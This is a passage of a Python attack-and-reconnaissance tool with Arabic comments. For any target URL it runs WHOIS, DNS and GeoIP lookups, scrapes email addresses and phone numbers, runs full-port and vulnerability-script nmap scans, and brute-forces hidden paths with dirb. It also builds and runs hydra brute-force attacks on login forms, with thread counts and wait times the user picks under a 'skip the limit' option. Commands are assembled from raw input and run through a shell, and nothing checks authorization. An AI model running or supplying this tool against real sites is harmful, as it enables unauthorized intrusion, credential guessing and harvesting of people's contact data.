# دالة جديدة لسؤال المستخدم إذا كان يريد حفظ التقرير
def user_save_report(report_text):
    save_choice = input(Fore.YELLOW + "Do you want to save the report in a txt file? (Yes/y or No/n): " + Style.RESET_ALL).strip().lower()
    if save_choice in ['yes', 'y']:
        while True:
            filename = input(Fore.YELLOW + "Enter the file name (must end with .txt): " + Style.RESET_ALL).strip()
            if filename.endswith('.txt'):
                with open(filename, "w") as file:
                    file.write(report_text)
                print_colored(f"Report saved successfully as {filename}", Fore.GREEN)
                print_colored(f"File path: {os.path.abspath(filename)}", Fore.GREEN)
                after_save_option()  # استدعاء الدالة بعد حفظ التقرير
                break
            else:
                print_colored("Invalid file name. Please enter a name ending with .txt", Fore.RED)
    elif save_choice in ['no', 'n']:
        after_save_option()
    else:
        print_colored("Invalid choice. Please enter Yes/y or No/n.", Fore.RED)
        user_save_report(report_text)


# دالة لسؤال المستخدم بعد حفظ التقرير
def after_save_option():
    print_colored("\nDo you want to:", Fore.CYAN)
    print_colored("1. Return to the main menu", Fore.MAGENTA)
    print_colored("2. Terminate the program", Fore.MAGENTA)
    
    while True:
        choice = input(Fore.YELLOW + "Choose an option: " + Style.RESET_ALL).strip()
        if choice == "1":
            main_menu()  # استدعاء القائمة الرئيسية مباشرة
            break
        elif choice == "2":
            print_colored("Best regards MR 𝗢𝗹𝗱 ..", Fore.RED)
            exit()
        else:
            print_colored("Incorrect choice 🚫 Please choose a valid option.", Fore.RED)



# دالة للسؤال بعد عدم حفظ التقرير
def after_save_option():
    print_colored("\nDo you want to:", Fore.CYAN)
    print_colored("1. Return to the main menu", Fore.MAGENTA)
    print_colored("2. Terminate the program", Fore.MAGENTA)
    
    while True:
        choice = input(Fore.YELLOW + "Choose an option: " + Style.RESET_ALL).strip()
        if choice == "1":
            confirm_return_to_main_menu()
            break
        elif choice == "2":
            print_colored("Best regards MR 𝗢𝗹𝗱 ..", Fore.RED)
            exit()
        else:
            print_colored("Incorrect choice 🚫 Please choose a valid option.", Fore.RED)


# تأكيد العودة إلى القائمة الرئيسية
def confirm_return_to_main_menu():
    confirmation = input(Fore.RED + "Returning to the main menu will delete the site report. Confirm by typing Yes/y or No/n: " + Style.RESET_ALL).strip().lower()
    if confirmation in ['yes', 'y']:
        main_menu()
    elif confirmation in ['no', 'n']:
        after_save_option()
    else:
        print_colored("Invalid choice. Please enter Yes/y or No/n.", Fore.RED)
        confirm_return_to_main_menu()
    



def detect_cms(content, url):
    if '/wp-content/' in content:
        return "WordPress"
    elif 'Joomla' in content:
        return "Joomla"
    elif 'Drupal' in requests.get(f"{url}/misc/drupal.js").text:
        return "Drupal"
    elif '/skin/frontend/' in content:
        return "Magento"
    else:
        return "Could Not Detect"

def check_ssl(domain):
    try:
        context = ssl.create_default_context()
        with context.wrap_socket(socket.socket(), server_hostname=domain) as s:
            s.connect((domain, 443))
            cert = s.getpeercert()
            return cert['notAfter']
    except Exception as e:
        return f"SSL Certificate check failed: {e}"

def check_cloudflare(domain):
    try:
        urlhh = f"http://api.hackertarget.com/httpheaders/?q={domain}"
        resulthh = requests.get(urlhh).text
        return "Detected" if 'cloudflare' in resulthh else "Not Detected"
    except Exception as e:
        return f"Error during Cloudflare check: {e}"

def check_robots(url):
    try:
        rbtresponse = requests.get(f"{url}/robots.txt").text
        return rbtresponse if rbtresponse else "Robots File Found But Empty!"
    except:
        return "Could NOT Find robots.txt!"

def check_whois(domain):
    try:
        return requests.get(f"http://api.hackertarget.com/whois/?q={domain}").text
    except Exception as e:
        return f"Error during WHOIS lookup: {e}"

def check_geoip(domain):
    try:
        return requests.get(f"http://api.hackertarget.com/geoip/?q={domain}").text
    except Exception as e:
        return f"Error during GEO IP lookup: {e}"

def check_dns(domain):
    try:
        return requests.get(f"http://api.hackertarget.com/dnslookup/?q={domain}").text
    except Exception as e:
        return f"Error during DNS lookup: {e}"

def check_subnet(domain):
    try:
        return requests.get(f"http://api.hackertarget.com/subnetcalc/?q={domain}").text
    except Exception as e:
        return f"Error during Subnet calculation: {e}"

def analyze_js(url):
    soup = BeautifulSoup(requests.get(url).text, 'html.parser')
    js_files = [script.get('src') for script in soup.find_all('script') if script.get('src')]
    return "\n".join(js_files)

def check_security_headers(headers):
    security_headers = {
        "Content-Security-Policy": "Content Security Policy",
        "Strict-Transport-Security": "Strict Transport Security",
        "X-Content-Type-Options": "X Content Type Options",
        "X-Frame-Options": "X Frame Options",
        "X-XSS-Protection": "X XSS Protection"
    }
    result = []
    for header, description in security_headers.items():
        if header in headers:
            result.append(f"{description} is present: {headers[header]}")
        else:
            result.append(f"{description} is missing!")
    return "\n".join(result)
    
    

def extract_emails_and_phones(url):
    try:
        content = requests.get(url).text

        # استخراج جميع النصوص التي تحتوي على الرمز @
        emails = re.findall(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}", content)

        # قائمة برموز الاتصال الدولية
        country_codes = [
            "+93", "+355", "+213", "+376", "+244", "+54", "+374", "+61", "+43", "+994",
            "+973", "+880", "+375", "+32", "+501", "+229", "+975", "+591", "+387", "+267",
            "+55", "+359", "+226", "+257", "+855", "+237", "+1", "+238", "+236", "+235",
            "+56", "+86", "+57", "+269", "+242", "+243", "+506", "+385", "+53", "+357",
            "+420", "+45", "+253", "+670", "+593", "+20", "+503", "+240", "+291", "+372",
            "+251", "+679", "+358", "+33", "+241", "+220", "+995", "+49", "+233", "+30",
            "+502", "+224", "+245", "+592", "+509", "+504", "+36", "+354", "+91", "+62",
            "+98", "+964", "+353", "+972", "+39", "+225", "+81", "+962", "+7", "+254",
            "+686", "+965", "+996", "+856", "+371", "+961", "+266", "+231", "+218", "+423",
            "+370", "+352", "+389", "+261", "+265", "+60", "+960", "+223", "+356", "+692",
            "+222", "+230", "+52", "+691", "+373", "+377", "+976", "+382", "+212", "+258",
            "+264", "+674", "+977", "+31", "+64", "+505", "+227", "+234", "+47", "+968",
            "+92", "+680", "+507", "+675", "+595", "+51", "+63", "+48", "+351", "+974",
            "+40", "+250", "+262", "+966", "+221", "+381", "+248", "+232", "+65", "+421",
            "+386", "+677", "+252", "+27", "+82", "+211", "+34", "+94", "+249", "+597",
            "+268", "+46", "+41", "+963", "+886", "+992", "+255", "+66", "+228", "+676",
            "+216", "+90", "+993", "+688", "+256", "+380", "+971", "+44", "+598", "+998",
            "+678", "+379", "+58", "+84", "+967", "+260", "+263"
        ]

        # استخراج جميع أرقام الهواتف المحتملة
        phones = re.findall(r"\+?\d{1,3}[-.\s]?\(?\d{2,4}?\)?[-.\s]?\d{3,4}[-.\s]?\d{3,4}", content)

        # التحقق من أن الأرقام تبدأ بأحد رموز الاتصال الدولية
        valid_phones = [phone for phone in phones if any(phone.startswith(code) for code in country_codes)]

        # تجهيز النتائج
        results = "Email Addresses Found:\n" + "\n".join(emails) if emails else "No Email Addresses Found"
        results += "\nPhone Numbers Found:\n" + "\n".join(valid_phones) if valid_phones else "\nNo Phone Numbers Found"
        
        return results
    except Exception as e:
        return f"Error extracting emails and phones: {e}"
        
        
        

def start_port_check(ip):
    choice = input(Fore.MAGENTA + "Do you want to perform a port scan? (Yes/y or No/n): " + Style.RESET_ALL).strip().lower()
    if choice in ['yes', 'y']:
        scan_open_ports(ip)
    elif choice in ['no', 'n']:
        print_colored("⚠️ Port scan was not performed on the website.", Fore.RED)
    else:
        print_colored("🔴 Invalid choice. Please enter Yes/y or No/n.", Fore.RED)

# فحص المنافذ المفتوحة
def scan_open_ports(ip):
    while True:
        choice = input(Fore.MAGENTA + "Do you want to specify the number of ports to scan? (Yes/y or No/n) : " + Style.RESET_ALL).strip().lower()
        if choice in ['yes', 'y']:
            try:
                max_ports = int(input(Fore.YELLOW + "Enter the number of ports to scan (e.g., 300): " + Style.RESET_ALL))
                port_range = f'1-{max_ports}'
                break
            except ValueError:
                print_colored("Please enter a valid number.", Fore.RED)
        elif choice in ['no', 'n']:
            port_range = '1-65535'
            break
        else:
            print_colored("Wrong choice 🚫 Please choose a valid option.", Fore.RED)

    print_colored("The scan may take from 1 to 5 minutes. Please wait...", Fore.CYAN)
    command = f"nmap -p {port_range} {ip}"
    
    try:
        result = subprocess.check_output(command, shell=True, text=True)
        print_colored(result, Fore.CYAN)
    except subprocess.CalledProcessError as e:
        print_colored(f"Error with port scanning: {e}", Fore.RED)

def save_report(url, report_text):
    filename = f"{url.replace('https://', '').replace('http://', '')}_Report.txt"
    with open(filename, "w") as file:
        file.write(report_text)
    print_colored(f"Report saved to {filename}", Fore.GREEN)
            
            


def print_colored(text, color):
    if text is None:
        text = "No result available"
    print(color + text + Style.RESET_ALL)

def get_tool_path(tool_name):
    if os.name == 'posix':
        return f"/usr/local/bin/{tool_name}"
    else:
        return f"/data/data/com.termux/files/home/bin/{tool_name}"

def check_url_validity():
    print(Fore.YELLOW + "Enter target URL (include 'http://' or 'https://'):")
    target_url = input(Fore.CYAN).strip()
    
    try:
        response = requests.get(target_url)
        if response.status_code == 200:
            print_colored("URL is valid and reachable.", Fore.MAGENTA)
            return target_url
        else:
            print_colored("URL is not reachable. Please check and try again.", Fore.RED)
            return check_url_validity()
    except requests.exceptions.RequestException:
        print_colored("Invalid URL. Please try again.", Fore.RED)
        return check_url_validity()

def start_vulnerability_scan(target_url, wordlist_path):
    dirb_path = get_tool_path("dirb")
    print_colored("Starting Dirb scan...", Fore.GREEN)
    os.system(f"dirb {target_url} {wordlist_path} -f")
    return_to_menu()

def extract_login_fields(url):
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        form = soup.find('form')
        username_field = password_field = None

        if form:
            input_fields = form.find_all('input')
            for field in input_fields:
                if field.get('type') == 'password':
                    password_field = field.get('name')
                elif 'user' in field.get('name', '').lower() or 'email' in field.get('name', '').lower():
                    username_field = field.get('name')

        return username_field, password_field
    except Exception as e:
        print_colored(f"Error fetching login fields: {e}", Fore.RED)
        return None, None

def confirm_fields(username_field, password_field):
    print_colored(f"Detected username field: {username_field}", Fore.CYAN)
    print_colored(f"Detected password field: {password_field}", Fore.CYAN)
    
    choice = input(Fore.YELLOW + "Do you want to use these fields? (Yes/No): \n" + Style.RESET_ALL).strip().lower()
    if choice in ['yes', 'y']:
        return username_field, password_field
    else:
        username_field = input(Fore.YELLOW + "Enter the username field manually: \n" + Style.RESET_ALL)
        password_field = input(Fore.YELLOW + "Enter the password field manually: \n" + Style.RESET_ALL)
        return username_field, password_field

def path_discovery():
    print_colored("\nPath Discovery Options", Fore.CYAN)
    print_colored("1. Hidden Path Discovery", Fore.MAGENTA)
    print_colored("2. Admin Page Brute Force", Fore.MAGENTA)
    print_colored("3. Back to Main Menu", Fore.RED)

    while True:
        choice = input(Fore.YELLOW + "Choose an option: \n" + Style.RESET_ALL)
        if choice == "3":
            main_menu()
            break
            
        if choice not in ['1', '2']:
            print_colored("Invalid choice! Please enter a valid number.", Fore.RED)
            continue
        
        target_url = check_url_validity()
        
        if choice == '1':
            wordlist_name = input(Fore.YELLOW + "Enter Wordlist filename (with extension): \n" + Style.RESET_ALL)
            start_vulnerability_scan(target_url, wordlist_name)
        
        elif choice == '2':
            username_field, password_field = extract_login_fields(target_url)
            
            if not (username_field and password_field):
                print_colored("Could not detect username or password fields.", Fore.RED)
                username_field = input(Fore.YELLOW + "Enter the username field manually: \n" + Style.RESET_ALL)
                password_field = input(Fore.YELLOW + "Enter the password field manually: \n" + Style.RESET_ALL)
            
            username_field, password_field = confirm_fields(username_field, password_field)

            bf_choice = input(Fore.YELLOW + "Choose Brute Force option:\n" + Fore.MAGENTA + "1. Both username and password\n2. Password only\n" + Style.RESET_ALL)

            if bf_choice == '1':
                userlist_name = input(Fore.YELLOW + "Enter username wordlist filename (with extension): \n" + Style.RESET_ALL)
                passlist_name = input(Fore.YELLOW + "Enter password wordlist filename (with extension): \n" + Style.RESET_ALL)
                target_url_no_protocol = input(Fore.YELLOW + "Enter target URL without protocol (e.g., example.com/login): \n" + Style.RESET_ALL)

                skip_limit = input(Fore.YELLOW + "Do you want to skip the limit while guessing? (Yes/No): \n" + Style.RESET_ALL).strip().lower()
                if skip_limit in ['no', 'n']:
                    hydra_command = (f'hydra -I -L {userlist_name} -P {passlist_name} https-post-form://{target_url_no_protocol}:"{username_field}=^USER^&{password_field}=^PASS^":"F=Invalid username or password"')
                else:
                    threads = input(Fore.YELLOW + "How many threads do you want to use? \n" + Style.RESET_ALL)
                    wait_time = input(Fore.YELLOW + "What is the wait time between each guess? \n" + Style.RESET_ALL)
                    hydra_command = (f'hydra -I -L {userlist_name} -P {passlist_name} https-post-form://{target_url_no_protocol}:"{username_field}=^USER^&{password_field}=^PASS^":"F=Invalid username or password" -t {threads} -W {wait_time}')

                # عرض الكود باللون السماوي قبل تنفيذه
                print(Fore.CYAN + hydra_command + Style.RESET_ALL)
                os.system(hydra_command)

            elif bf_choice == '2':
                username = input(Fore.YELLOW + "Enter username: \n" + Style.RESET_ALL)
                passlist_name = input(Fore.YELLOW + "Enter password wordlist filename (with extension): \n" + Style.RESET_ALL)
                target_url_no_protocol = input(Fore.YELLOW + "Enter target URL without protocol (e.g., example.com/login): \n" + Style.RESET_ALL)

                skip_limit = input(Fore.YELLOW + "Do you want to skip the limit while guessing? (Yes/No): \n" + Style.RESET_ALL).strip().lower()
                if skip_limit in ['no', 'n']:
                    hydra_command = (f'hydra -l {username} -P {passlist_name} {target_url_no_protocol.split("/")[0]} https-post-form "/{"/".join(target_url_no_protocol.split("/")[1:])}:{username_field}=^USER^&{password_field}=^PASS^:F=Invalid username or password"')
                else:
                    threads = input(Fore.YELLOW + "How many threads do you want to use? \n" + Style.RESET_ALL)
                    wait_time = input(Fore.YELLOW + "What is the wait time between each guess? \n" + Style.RESET_ALL)
                    hydra_command = (f'hydra -l {username} -P {passlist_name} {target_url_no_protocol.split("/")[0]} https-post-form "/{"/".join(target_url_no_protocol.split("/")[1:])}:{username_field}=^USER^&{password_field}=^PASS^:F=Invalid username or password" -t {threads} -W {wait_time}')

                # عرض الكود باللون السماوي قبل تنفيذه
                print(Fore.CYAN + hydra_command + Style.RESET_ALL)
                os.system(hydra_command)

            return_to_menu()


def nmap_scan():
    print_colored("\nNmap Scan Options", Fore.CYAN)
    print_colored("1. Deep Vulnerability Scan", Fore.MAGENTA)
    print_colored("2. Medium Vulnerability Scan", Fore.MAGENTA)
    print_colored("3. Custom Command", Fore.MAGENTA)
    print_colored("4. Back to Main Menu", Fore.RED)

    while True:
        choice = input(Fore.YELLOW + "Choose an option: \n" + Style.RESET_ALL)
        if choice == "4":
            main_menu()
            break  # العودة للقائمة الرئيسية
            
        if choice not in ['1', '2', '3']:
            print_colored("Invalid choice! Please enter a valid number.", Fore.RED)
            continue

        # حلقة للتحقق من صحة رابط الموقع أو عنوان IP
        while True:
            target = input(Fore.YELLOW + "Enter target IP or URL without protocol: \n" + Style.RESET_ALL).strip()
            try:
                ip_address = socket.gethostbyname(target)
                print_colored(f"Resolved IP address: {ip_address}", Fore.CYAN)
                break  # الخروج من حلقة التحقق إذا تم إيجاد عنوان IP
            except socket.gaierror:
                print_colored("Invalid URL or IP address. Please enter a valid target.", Fore.RED)

        # سؤال المستخدم عن تحديد عدد البورتات
        port_range_choice = input(Fore.YELLOW + "Do you want to specify the port range to scan? (Yes/y or No/n): \n" + Style.RESET_ALL).strip().lower()
        if port_range_choice == 'yes' or port_range_choice == 'y':
            while True:
                ports = input(Fore.YELLOW + "Enter the port range (e.g., 1-300): \n" + Style.RESET_ALL).strip()
                # التحقق من تنسيق البورتات
                if '-' in ports and all(part.isdigit() for part in ports.split('-')) and len(ports.split('-')) == 2:
                    break
                else:
                    print_colored("Invalid format! Please enter the port range in the format 'start-end'.", Fore.RED)
        else:
            ports = "1-65535"  # افتراض فحص جميع المنافذ

        # بدء الفحص باستخدام subprocess لتظهر النتائج مباشرة
        if choice == '1':
            print_colored("Starting deep vulnerability scan...", Fore.GREEN)
            command = f"nmap --stats-every 10s -T4 -sS -sV -O -n --open --script=vulners,vuln -p {ports}  --min-rate 100 --max-retries 2 --max-scan-delay 20ms {ip_address}"
        elif choice == '2':
            print_colored("Starting medium vulnerability scan...", Fore.GREEN)
            command = f"nmap --stats-every 15s -T5 -sS -sV --open --min-hostgroup 32 --min-parallelism 16 -O -p {ports} {ip_address}"
        elif choice == '3':
            command = input(Fore.YELLOW + "Enter Nmap command ( e.g. , -sS -sV -Pn ) : \n" + Style.RESET_ALL)
            print_colored("Starting custom Nmap scan...", Fore.GREEN)
            command = f"nmap {command} -p {ports} {ip_address}"

        # تنفيذ الأمر وعرض النتائج بشكل فوري
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        while True:
            output = process.stdout.readline()
            if output == b"" and process.poll() is not None:
                break
            if output:
                print(output.decode().strip())

        # سؤال المستخدم إذا كان يريد حفظ التقرير
        save_report = input(Fore.YELLOW + "Do you want to save the report in a txt file? (Yes/y or No/n): \n" + Style.RESET_ALL).strip().lower()
        if save_report == 'yes' or save_report == 'y':
            while True:
                file_name = input(Fore.YELLOW + "Enter the file name (without .txt): \n" + Style.RESET_ALL).strip()
                if file_name.endswith('.txt'):
                    print_colored("File name should not include .txt. Please enter a valid name.", Fore.RED)
                else:
                    file_name += '.txt'
                    with open(file_name, 'w') as report_file:
                        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                        report_file.write(process.stdout.read().decode())
                    print_colored(f"Report saved successfully as: {os.path.abspath(file_name)}", Fore.GREEN)
                    break  # الخروج من حلقة إدخال اسم الملف

        # خيارات العودة
        while True:
            return_choice = input(Fore.YELLOW + "Do you want to:\n" + 
                  Fore.MAGENTA + "1. Return to the main menu\n" + 
                  "2. Terminate the program\n" + 
                  Style.RESET_ALL).strip()

            if return_choice == "1":
                print_colored("Warning: Returning to the main menu will delete all scan results.", Fore.RED)
                confirm_return = input(Fore.YELLOW + "Are you sure you want to return? (Yes/y or No/n): \n" + Style.RESET_ALL).strip().lower()
                if confirm_return == 'yes' or confirm_return == 'y':
                    main_menu()
                    break
            elif return_choice == "2":
                print_colored("Best regards MR 𝗢𝗹𝗱 ..", Fore.RED)
                exit()
            else:
                print_colored("Incorrect choice 🚫 Please choose a valid option.", Fore.RED)

def return_to_menu():
    print_colored("\nDo you want to:", Fore.CYAN)
    print_colored("1. Return to the checklist", Fore.MAGENTA)
    print_colored("2. Terminate the program", Fore.MAGENTA)
    
    while True:
        choice = input(Fore.YELLOW + "Choose an option: \n" + Style.RESET_ALL)
        if choice == "1":
            main_menu()
            break
        elif choice == "2":
            print_colored("Best regards MR 𝗢𝗹𝗱 ..", Fore.RED)
            exit()
        else:
            print_colored("Incorrect choice 🚫 Please choose a valid option.", Fore.RED)



if __name__ == "__main__":
    main_menu()
